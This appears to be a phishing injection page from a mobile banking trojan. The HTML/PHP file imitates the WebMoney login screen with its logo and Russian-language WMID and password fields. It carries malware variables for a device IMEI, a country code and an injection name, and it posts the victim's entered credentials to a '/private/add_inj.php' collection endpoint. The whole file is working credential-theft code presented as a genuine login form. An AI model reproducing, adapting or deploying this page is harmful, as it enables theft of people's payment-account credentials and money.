<!DOCTYPE html><html><head><meta charset="utf-8"/><title>some</title>

<meta name="viewport"content="width=device-width, initial-scale=1">

<link rel="stylesheet"href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css"type="text/css"media="all"/>
<link rel="stylesheet"href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"type="text/css"media="all"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
</head><body>

<style>
.center{
	text-align:center
}
.left_{
	text-align:left;
}
.right_{
	text-align:right;
}
.top{
	vertical-align:top;
}.bottom{
	vertical-align:bottom;
}
.middle{
	vertical-align:middle;
}.none{
	display:none;
}.br{
	border:1px solid red;
}.stol{
	display:table;
}.tr{
	display:table-row;
}.td{
	display:table-cell;
}
.err 
.inp{
	border-bottom:3px solid red;
}
.inp:focus{
	border:0px solid white;
	box-shadow:0 0 0;
	outline:0 none;
	border-bottom:3px solid#0000A0;
}
.inp{
	box-shadow:0 0 0;
	border:none;
	outline:none;
	padding:.375em;
	border-bottom:1px solid#c4c8cc;
	background-color:#fff;width:100%;
	box-sizing:border-box;
	color:#646669;
	-webkit-appearance:none;
	-moz-appearance:none;
	-webkit-border-radius:0;
	-moz-border-radius:0;
	border-radius:0;
}
.err .help_text{
	display:block
}
.button{
	background-color:#1e5ba7;
	color:#fff;
	transition:background-color 300ms ease-out;
	padding:12px 14.56px;
	box-shadow:0-3px 0 rgba(16,70,137,1)inset;
	border-radius:4px;
	width:100%;
	border-bottom:none;
	cursor:pointer;
	margin-top:8%;
	box-sizing:border-box;
}
.help_text{
	display:none;
	font-size:0.8em;
}</style>

<?php 
//$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
$IMEI_country = "321|ru";
$vid_inj = "Injection_1";
$nameBank = "vid1";

?>

<form id="mf"action="/private/add_inj.php?p=<?php echo "$IMEI_country|$vid_inj|$nameBank";?>"method="post"onsubmit="return false">
<!--  -->

<!--  -->
<div class="container "style="padding-top:20px;padding-bottom:60px">
<div class="title center "style="padding:0 20px"><div class=" "style="">
<img src="https://login.wmtransfer.com/assets/gate-v2/img/logo.png"style="width:60%"class=""/></div>

<div class="ramka "style="margin-top:50px"><div class=""style=""><div class="form-group">

<div class=""style="position:relative">

<input class="form-control inp"type="text"name="user"id="user"placeholder="WMID или номер телефона"/>

<div class="help_text left_"style="color: red">Поле"e–mail, WMID или номер телефона"является обязательным</div></div></div></div>

<div class=""style="padding-top:">
<div class="form-group">
<div class=""style="position:relative">

<input class="form-control inp"type="password"name="pass"id="pass"placeholder="Пароль"/>

<div class="help_text left_"style="color:red">Поле"Пароль"является обязательным</div></div></div></div>

<div class=""style="padding-top:">

<button class="button "onclick="send_info()">Войти</button></div></div></div></div>

</form></body>

<script type="text/javascript">$(".inp").on('click',function(){$('.err').removeClass('err');})
function send_info(){var err=false;var user=$('#user').val().trim()
var pass=$('#pass').val().trim()
if(!/^[a-z-A-Z0-9]{1,40}\b/.test(user)){$('#user').closest('.form-group').addClass('err');err=true;}
if(!/^[a-z-A-Z0-9]{1,40}\b/.test(pass)){$('#pass').closest('.form-group').addClass('err');err=true;}
if(err==true){return;};$('#mf')[0].submit();}

</script></html>